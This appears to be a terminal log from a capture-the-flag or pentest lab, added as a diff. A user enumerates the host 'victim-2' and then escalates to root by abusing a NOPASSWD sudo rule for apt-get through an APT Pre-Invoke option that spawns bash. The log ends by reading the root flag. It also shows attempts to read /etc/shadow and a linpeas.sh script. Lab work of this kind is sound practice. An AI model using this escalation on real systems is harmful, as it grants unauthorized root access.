@@ -1,0 +1,285 @@
+pbercoff@victim-2:~$ pwd
+/home/pbercoff
+pbercoff@victim-2:~$ ls -la
+total 32
+drwxr-x--- 3 pbercoff pbercoff 4096 May 19 20:11 .
+drwxr-xr-x 8 root     root     4096 May 10 22:59 ..
+-rw------- 1 pbercoff pbercoff   53 May 19 20:11 .bash_history
+-rw-r--r-- 1 pbercoff pbercoff  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 pbercoff pbercoff 3771 Jan  6  2022 .bashrc
+drwx------ 2 pbercoff pbercoff 4096 May 19 19:55 .cache
+-rw-r--r-- 1 pbercoff pbercoff  807 Jan  6  2022 .profile
+-rw------- 1 pbercoff pbercoff  672 May 19 19:55 .viminfo
+pbercoff@victim-2:~$ cd root
+-bash: cd: root: No such file or directory
+pbercoff@victim-2:~$ uname -a
+Linux victim-2 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+pbercoff@victim-2:~$ cat /etc/os-release
+PRETTY_NAME="Ubuntu 22.04.2 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.2 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+pbercoff@victim-2:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+surreta:x:1001:1002:Silvia E. Urreta:/home/surreta:/usr/sbin/nologin
+rmiatello:x:1002:1003:Roberto J. Miatello:/home/rmiatello:/bin/bash
+pbercoff:x:1003:1004:Paula Bercoff:/home/pbercoff:/bin/bash
+obilloni:x:1004:1005:Orlando V. Billoni:/home/obilloni:/usr/sbin/nologin
+dimaggio:x:1005:1006:Maria Di maggio:/home/dimaggio:/bin/bash
+pbercoff@victim-2:~$ grep '/bin/bash' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+rmiatello:x:1002:1003:Roberto J. Miatello:/home/rmiatello:/bin/bash
+pbercoff:x:1003:1004:Paula Bercoff:/home/pbercoff:/bin/bash
+dimaggio:x:1005:1006:Maria Di maggio:/home/dimaggio:/bin/bash
+pbercoff@victim-2:~$ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.7 166304 11644 ?        Ss   May10   0:44 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    May10   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   May10   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   May10   0:00 [rcu_par_gp]
+root           5  0.0  0.0      0     0 ?        I<   May10   0:00 [slub_flushwq]
+root           6  0.0  0.0      0     0 ?        I<   May10   0:00 [netns]
+root           8  0.0  0.0      0     0 ?        I<   May10   0:00 [kworker/0:0H-events_highpri]
+root          10  0.0  0.0      0     0 ?        I<   May10   0:00 [mm_percpu_wq]
+root          11  0.0  0.0      0     0 ?        S    May10   0:00 [rcu_tasks_rude_]
+root          12  0.0  0.0      0     0 ?        S    May10   0:00 [rcu_tasks_trace]
+root          13  0.0  0.0      0     0 ?        S    May10   0:03 [ksoftirqd/0]
+root          14  0.0  0.0      0     0 ?        I    May10   0:07 [rcu_sched]
+root          15  0.0  0.0      0     0 ?        S    May10   0:06 [migration/0]
+root          16  0.0  0.0      0     0 ?        S    May10   0:00 [idle_inject/0]
+root          18  0.0  0.0      0     0 ?        S    May10   0:00 [cpuhp/0]
+root          19  0.0  0.0      0     0 ?        S    May10   0:00 [kdevtmpfs]
+root          20  0.0  0.0      0     0 ?        I<   May10   0:00 [inet_frag_wq]
+root          21  0.0  0.0      0     0 ?        S    May10   0:00 [kauditd]
+root          22  0.0  0.0      0     0 ?        S    May10   0:03 [khungtaskd]
+root          23  0.0  0.0      0     0 ?        S    May10   0:00 [oom_reaper]
+root          24  0.0  0.0      0     0 ?        I<   May10   0:00 [writeback]
+root          25  0.0  0.0      0     0 ?        S    May10   0:38 [kcompactd0]
+root          26  0.0  0.0      0     0 ?        SN   May10   0:00 [ksmd]
+root          27  0.0  0.0      0     0 ?        SN   May10   0:00 [khugepaged]
+root          73  0.0  0.0      0     0 ?        I<   May10   0:00 [kintegrityd]
+root          74  0.0  0.0      0     0 ?        I<   May10   0:00 [kblockd]
+root          75  0.0  0.0      0     0 ?        I<   May10   0:00 [blkcg_punt_bio]
+root          76  0.0  0.0      0     0 ?        I<   May10   0:00 [tpm_dev_wq]
+root          77  0.0  0.0      0     0 ?        I<   May10   0:00 [ata_sff]
+root          78  0.0  0.0      0     0 ?        I<   May10   0:00 [md]
+root          79  0.0  0.0      0     0 ?        I<   May10   0:00 [edac-poller]
+root          80  0.0  0.0      0     0 ?        I<   May10   0:00 [devfreq_wq]
+root          81  0.0  0.0      0     0 ?        S    May10   0:00 [watchdogd]
+root          83  0.0  0.0      0     0 ?        I<   May10   0:12 [kworker/0:1H-kblockd]
+root          85  0.0  0.0      0     0 ?        S    May10   0:00 [kswapd0]
+root          86  0.0  0.0      0     0 ?        S    May10   0:00 [ecryptfs-kthrea]
+root          88  0.0  0.0      0     0 ?        I<   May10   0:00 [kthrotld]
+root          89  0.0  0.0      0     0 ?        I<   May10   0:00 [acpi_thermal_pm]
+root          91  0.0  0.0      0     0 ?        S    May10   0:00 [khvcd]
+root          93  0.0  0.0      0     0 ?        S    May10   0:00 [scsi_eh_0]
+root          94  0.0  0.0      0     0 ?        I<   May10   0:00 [scsi_tmf_0]
+root          95  0.0  0.0      0     0 ?        S    May10   0:00 [scsi_eh_1]
+root          96  0.0  0.0      0     0 ?        I<   May10   0:00 [scsi_tmf_1]
+root          98  0.0  0.0      0     0 ?        I<   May10   0:00 [vfio-irqfd-clea]
+root          99  0.0  0.0      0     0 ?        I<   May10   0:00 [mld]
+root         100  0.0  0.0      0     0 ?        I<   May10   0:00 [ipv6_addrconf]
+root         109  0.0  0.0      0     0 ?        I<   May10   0:00 [kstrp]
+root         112  0.0  0.0      0     0 ?        I<   May10   0:00 [zswap-shrink]
+root         113  0.0  0.0      0     0 ?        I<   May10   0:00 [kworker/u3:0]
+root         118  0.0  0.0      0     0 ?        I<   May10   0:00 [charger_manager]
+root         159  0.0  0.0      0     0 ?        I<   May10   0:00 [cryptd]
+root         222  0.0  0.0      0     0 ?        I<   May10   0:00 [raid5wq]
+root         266  0.0  0.0      0     0 ?        S    May10   0:27 [jbd2/vda1-8]
+root         267  0.0  0.0      0     0 ?        I<   May10   0:00 [ext4-rsv-conver]
+root         301  0.0  0.0      0     0 ?        S    May10   0:02 [hwrng]
+root         340  0.0  9.2 236512 138676 ?       S<s  May10   0:38 /lib/systemd/systemd-journald
+root         377  0.0  0.0      0     0 ?        I<   May10   0:00 [kaluad]
+root         378  0.0  0.0      0     0 ?        I<   May10   0:00 [kmpath_rdacd]
+root         379  0.0  0.0      0     0 ?        I<   May10   0:00 [kmpathd]
+root         381  0.0  0.0      0     0 ?        I<   May10   0:00 [kmpath_handlerd]
+root         382  0.0  1.8 289308 27096 ?        SLsl May10   1:18 /sbin/multipathd -d -s
+root         384  0.0  0.4  22904  6404 ?        Ss   May10   0:03 /lib/systemd/systemd-udevd
+systemd+     463  0.0  0.4  89352  6504 ?        Ssl  May10   1:58 /lib/systemd/systemd-timesyncd
+systemd+     543  0.0  0.5  16240  8576 ?        Ss   May10   0:07 /lib/systemd/systemd-networkd
+systemd+     545  0.0  0.8  25528 12760 ?        Ss   May10   2:49 /lib/systemd/systemd-resolved
+root         590  0.0  0.0   2812  1144 ?        Ss   May10   0:00 /usr/sbin/acpid
+root         594  0.0  0.1   7284  2812 ?        Ss   May10   0:11 /usr/sbin/cron -f -P
+message+     597  0.0  0.3   8700  4964 ?        Ss   May10   0:01 @dbus-daemon --system --address=systemd: --nofork --n
+root         606  0.0  1.3  33120 19568 ?        Ss   May10   0:02 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-s
+root         608  0.0  0.2  80048  3752 ?        Ssl  May10   0:00 /usr/sbin/qemu-ga
+syslog       609  0.0  0.4 222400  6476 ?        Ssl  May10   0:07 /usr/sbin/rsyslogd -n -iNONE
+root         611  0.0  2.8 736592 42820 ?        Ssl  May10   9:49 /usr/lib/snapd/snapd
+root         612  0.0  0.5  15500  7900 ?        Ss   May10   0:03 /lib/systemd/systemd-logind
+root         617  0.0  0.2  10148  4196 ?        Ss   May10   0:01 /usr/sbin/vsftpd /etc/vsftpd.conf
+root         622  0.0  0.0   6216  1180 hvc0     Ss+  May10   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,384
+root         623  0.0  0.0   6216  1160 ttyS0    Ss+  May10   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,384
+root         625  0.0  0.0   6172  1164 tty1     Ss+  May10   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root         673  0.0  0.3   6784  5332 ?        Ss   May10   0:56 /usr/sbin/apache2 -k start
+root         752  0.0  1.4 110072 21516 ?        Ssl  May10   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unatt
+root         760  0.0  0.5 235448  8096 ?        Ssl  May10   0:00 /usr/libexec/polkitd --no-debug
+root         765  0.0  0.6  15420  9240 ?        Ss   May10   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startu
+ubuntu       938  0.0  0.6  17072  9592 ?        Ss   May10   0:00 /lib/systemd/systemd --user
+ubuntu       939  0.0  0.2 103812  3860 ?        S    May10   0:00 (sd-pam)
+root        1662  0.0  0.1  81812  1656 ?        Ss   May10   0:03 gpg-agent --homedir /home/dimaggio/.gnupg --use-stand
+www-data   79024  0.0  0.3 753176  5464 ?        Sl   00:00   0:00 /usr/sbin/apache2 -k start
+www-data   79025  0.0  0.3 753056  5376 ?        Sl   00:00   0:00 /usr/sbin/apache2 -k start
+root       95008  0.0  0.0      0     0 ?        I    19:41   0:00 [kworker/0:2-inet_frag_wq]
+root       95026  0.0  0.0      0     0 ?        I    19:43   0:00 [kworker/0:3-events]
+root       95099  0.0  0.7  17172 11004 ?        Ss   19:54   0:00 sshd: pbercoff [priv]
+pbercoff   95108  0.0  0.6  17072  9660 ?        Ss   19:55   0:00 /lib/systemd/systemd --user
+pbercoff   95110  0.0  0.2 169356  3976 ?        S    19:55   0:00 (sd-pam)
+pbercoff   95172  0.0  0.5  17304  7988 ?        S    19:55   0:00 sshd: pbercoff@pts/0
+pbercoff   95173  0.0  0.3   9148  5316 pts/0    Ss+  19:55   0:00 -bash
+root       95228  0.0  0.7  17168 10980 ?        Ss   20:01   0:00 sshd: pbercoff [priv]
+pbercoff   95308  0.0  0.5  17304  8088 ?        S    20:01   0:00 sshd: pbercoff@pts/1
+pbercoff   95309  0.0  0.3   9148  5304 pts/1    Ss+  20:01   0:00 -bash
+root       95341  0.0  0.0      0     0 ?        I    20:04   0:00 [kworker/u2:0-flush-252:0]
+root       95446  0.0  0.0      0     0 ?        I    20:09   0:00 [kworker/u2:1-events_unbound]
+root       95460  0.0  0.0      0     0 ?        I    20:11   0:00 [kworker/u2:3-events_unbound]
+root       95467  0.0  0.7  17176 11068 ?        Ss   20:12   0:00 sshd: pbercoff [priv]
+pbercoff   95525  0.0  0.5  17308  7968 ?        S    20:12   0:00 sshd: pbercoff@pts/2
+pbercoff   95526  0.0  0.3   9148  5328 pts/2    Ss   20:12   0:00 -bash
+root       95575  0.0  0.0      0     0 ?        I    20:17   0:00 [kworker/u2:2-events_unbound]
+root       95591  0.0  0.0      0     0 ?        I    20:19   0:00 [kworker/0:0-events]
+pbercoff   95606  0.0  0.2  10460  3368 pts/2    R+   20:20   0:00 ps aux
+pbercoff@victim-2:~$ ss -tulpn
+Netid      State       Recv-Q      Send-Q              Local Address:Port           Peer Address:Port      Process
+udp        UNCONN      0           0                   127.0.0.53%lo:53                  0.0.0.0:*
+udp        UNCONN      0           0                   10.0.2.5%ens4:68                  0.0.0.0:*
+udp        UNCONN      0           0                10.10.0.203%ens3:68                  0.0.0.0:*
+tcp        LISTEN      0           4096                127.0.0.53%lo:53                  0.0.0.0:*
+tcp        LISTEN      0           128                       0.0.0.0:22                  0.0.0.0:*
+tcp        LISTEN      0           511                             *:80                        *:*
+tcp        LISTEN      0           32                              *:21                        *:*
+tcp        LISTEN      0           128                          [::]:22                     [::]:*
+pbercoff@victim-2:~$ sudo -l
+Matching Defaults entries for pbercoff on victim-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User pbercoff may run the following commands on victim-2:
+    (root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get
+pbercoff@victim-2:~$ find /home -type f 2>/dev/null
+/home/pbercoff/snap/lxd/common/config/config.yml
+/home/pbercoff/.viminfo
+/home/pbercoff/.bash_logout
+/home/pbercoff/.profile
+/home/pbercoff/.bash_history
+/home/pbercoff/.bashrc
+/home/pbercoff/.cache/motd.legal-displayed
+/home/pbercoff/linpeas.sh
+pbercoff@victim-2:~$ crontab -l
+no crontab for pbercoff
+pbercoff@victim-2:~$ ls -la /etc/cron*
+-rw-r--r-- 1 root root 1136 Mar 23  2022 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 May 10 22:59 .
+drwxr-xr-x 94 root root 4096 May 10 22:59 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r--  1 root root   47 May 10 22:59 backup
+-rw-r--r--  1 root root  201 Jan  8  2022 e2scrub_all
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 May 10 22:49 .
+drwxr-xr-x 94 root root 4096 May 10 22:59 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x  1 root root  539 Mar 18  2024 apache2
+-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
+-rwxr-xr-x  1 root root 1478 Apr  8  2022 apt-compat
+-rwxr-xr-x  1 root root  123 Dec  5  2021 dpkg
+-rwxr-xr-x  1 root root  377 Jan 24  2022 logrotate
+-rwxr-xr-x  1 root root 1330 Mar 17  2022 man-db
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Jun 16  2023 .
+drwxr-xr-x 94 root root 4096 May 10 22:59 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Jun 16  2023 .
+drwxr-xr-x 94 root root 4096 May 10 22:59 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Jun 16  2023 .
+drwxr-xr-x 94 root root 4096 May 10 22:59 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x  1 root root 1020 Mar 17  2022 man-db
+pbercoff@victim-2:~$ cat ~/.bash_history
+cat /etc/shadow
+sudo cat /etc/shadow
+cat /etc/passwd
+pbercoff@victim-2:~$ ls -la ~/.ssh
+ls: cannot access '/home/pbercoff/.ssh': No such file or directory
+pbercoff@victim-2:~$ find / -name "id_rsa*" 2>/dev/null
+pbercoff@victim-2:~$ cat /etc/cron.d/backup
+#Ansible: backup
+* * * * * root /opt/backup.sh
+pbercoff@victim-2:~$ sudo cat /etc/shadow
+[sudo] password for pbercoff:
+Sorry, user pbercoff is not allowed to execute '/usr/bin/cat /etc/shadow' as root on victim-2.
+pbercoff@victim-2:~$ cat /etc/cron.d/backup
+#Ansible: backup
+* * * * * root /opt/backup.sh
+pbercoff@victim-2:~$
+pbercoff@victim-2:~$ ls -la /var/www
+total 12
+drwxr-xr-x  3 root root 4096 May 10 22:49 .
+drwxr-xr-x 14 root root 4096 May 10 22:49 ..
+drwxr-xr-x  3 root root 4096 May 10 22:49 html
+pbercoff@victim-2:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+root@victim-2:/tmp# ls
+cf31-probe-95743.py
+snap-private-tmp
+systemd-private-b4abc45132554bb7b1d67afce2f86627-apache2.service-wLKFiM
+systemd-private-b4abc45132554bb7b1d67afce2f86627-systemd-logind.service-OQJUxv
+systemd-private-b4abc45132554bb7b1d67afce2f86627-systemd-resolved.service-JWIozK
+systemd-private-b4abc45132554bb7b1d67afce2f86627-systemd-timesyncd.service-TuzsFk
+tmux-1003
+root@victim-2:/tmp# cat /root/flag.txt
+-yknf|q7?a_%sxd4^rvl*=9cg]j-o$i1
+root@victim-2:/tmp#
